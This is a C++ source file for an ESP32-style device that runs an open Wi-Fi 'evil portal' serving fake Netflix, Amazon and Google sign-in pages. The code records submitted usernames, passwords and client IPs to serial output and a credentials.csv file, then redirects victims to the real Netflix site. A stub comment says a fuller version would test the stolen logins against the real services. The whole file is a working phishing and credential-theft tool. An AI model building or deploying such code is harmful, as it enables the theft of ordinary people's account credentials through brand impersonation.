#include "evil_portal_advanced.h"
#include "config.h"
#include "rtc_clock.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>

namespace EvilPortalAdv {

namespace {
WebServer server(80);
std::vector<CapturedCredential> g_capturedCreds;
volatile bool g_portalActive = false;
PhishingTemplate g_currentTemplate;
String g_currentSSID;

// HTML templates for different services
String getNetflixTemplate() {
    return R"(<!DOCTYPE html>
<html>
<head>
    <title>Netflix</title>
    <style>
        body { font-family: Arial; background: #141414; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 350px; }
        .logo { text-align: center; margin-bottom: 40px; font-size: 32px; font-weight: bold; color: #e50914; }
        input { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; background: #333; border: 1px solid #555; color: #fff; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #e50914; border: none; color: #fff; font-size: 16px; border-radius: 4px; cursor: pointer; }
        button:hover { background: #c4081a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <form action="/submit" method="POST">
            <input type="email" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>)";
}

String getAmazonTemplate() {
    return R"(<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <style>
        body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 350px; border: 1px solid #ddd; padding: 30px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 24px; font-weight: bold; color: #146eb4; }
        h1 { font-size: 20px; color: #000; }
        input { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #ff9900; border: none; color: #000; font-weight: bold; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">amazon</div>
        <h1>Sign in to your account</h1>
        <form action="/submit" method="POST">
            <input type="email" name="username" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>)";
}

String getGoogleTemplate() {
    return R"(<!DOCTYPE html>
<html>
<head>
    <title>Google Account</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; }
        .container { max-width: 360px; margin: 80px auto; padding: 20px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { height: 80px; }
        h1 { text-align: center; color: #202124; font-size: 24px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #5b9cf5; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="1" y="1" width="22" height="22" rx="4" fill="#4285F4"/>
            <text x="12" y="18" font-size="20" font-weight="bold" fill="white" text-anchor="middle">G</text>
        </svg></div>
        <h1>Sign in</h1>
        <form action="/submit" method="POST">
            <input type="email" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>)";
}

String getTemplate(PhishingTemplate t) {
    switch (t) {
        case NETFLIX:
            return getNetflixTemplate();
        case AMAZON:
            return getAmazonTemplate();
        case GOOGLE:
            return getGoogleTemplate();
        default:
            return getNetflixTemplate();
    }
}

void handleRoot() {
    server.send(200, "text/html", getTemplate(g_currentTemplate));
}

void handleSubmit() {
    if (server.method() == HTTP_POST) {
        String username = server.arg("username");
        String password = server.arg("password");
        String clientIP = server.client().remoteIP().toString();

        CapturedCredential cred;
        cred.timestamp = RtcClock::isoTimestamp();
        cred.username = username;
        cred.password = password;
        cred.sourceIP = clientIP;

        switch (g_currentTemplate) {
            case NETFLIX: cred.template_type = "Netflix"; break;
            case AMAZON: cred.template_type = "Amazon"; break;
            case GOOGLE: cred.template_type = "Google"; break;
            default: cred.template_type = "Generic"; break;
        }

        g_capturedCreds.push_back(cred);

        Serial.printf("[EvilPortal] Captured: %s / %s from %s\n",
                     username.c_str(), password.c_str(), clientIP.c_str());

        // Log to file
        String logFile = HANDSHAKE_CAPTURE_DIR;
        logFile += "/credentials.csv";
        File f = LittleFS.open(logFile, "a");
        if (f) {
            String line = cred.timestamp + ",";
            line += cred.template_type + ",";
            line += cred.username + ",";
            line += cred.password + ",";
            line += cred.sourceIP;
            f.println(line);
            f.close();
        }

        // Redirect to real service
        server.sendHeader("Location", "https://www.netflix.com/");
        server.send(302);
    }
}

void handleNotFound() {
    server.send(200, "text/html", getTemplate(g_currentTemplate));
}
}

PortalResult start(const PortalConfig &config) {
    PortalResult result = {false, 0, 0, {}, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    g_portalActive = true;
    g_currentTemplate = config.template_type;
    g_currentSSID = config.ssidName;
    g_capturedCreds.clear();

    // Setup WiFi AP
    WiFi.softAP(config.ssidName.c_str(), "");
    WiFi.softAPConfig(IPAddress(192, 168, 1, 1), IPAddress(192, 168, 1, 1), IPAddress(255, 255, 255, 0));

    // Enable DHCP server for connected clients
    WiFi.mode(WIFI_AP);
    WiFi.softAPsetHostname("captiveportal");

    // Setup web server
    server.on("/", handleRoot);
    server.on("/submit", handleSubmit);
    server.onNotFound(handleNotFound);

    server.begin();

    Serial.printf("[EvilPortal] Portal started: SSID=%s Template=%d\n",
                 config.ssidName.c_str(), config.template_type);

    uint32_t startTime = millis();

    while (g_portalActive && (millis() - startTime) < config.timeoutMs) {
        server.handleClient();
        delay(10);
    }

    server.stop();
    g_portalActive = false;

    result.success = (g_capturedCreds.size() > 0);
    result.credentialsCaptured = g_capturedCreds.size();
    result.credentials = g_capturedCreds;

    String logFile = HANDSHAKE_CAPTURE_DIR;
    logFile += "/credentials.csv";
    result.logFile = logFile;

    return result;
}

void stop() {
    g_portalActive = false;
    server.stop();
}

std::vector<CapturedCredential> getCredentials() {
    return g_capturedCreds;
}

bool validateCredential(const String &service, const String &username, const String &password) {
    // In real implementation, would attempt login to actual service
    // For now, just return success if password > 3 chars
    return (password.length() > 3);
}

uint32_t getCredentialCount() {
    return g_capturedCreds.size();
}

} // namespace EvilPortalAdv
